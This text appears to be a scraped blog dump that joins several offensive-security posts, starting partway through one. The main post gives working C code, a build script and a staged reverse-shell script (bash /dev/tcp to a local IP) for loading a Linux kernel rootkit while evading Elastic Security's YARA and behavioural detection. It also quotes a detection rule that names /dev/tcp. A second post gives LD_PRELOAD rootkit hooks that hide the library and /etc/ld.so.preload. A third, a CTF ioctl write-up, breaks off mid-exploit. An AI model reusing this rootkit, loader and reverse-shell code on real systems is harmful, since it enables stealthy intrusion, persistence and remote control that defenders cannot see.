} // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); 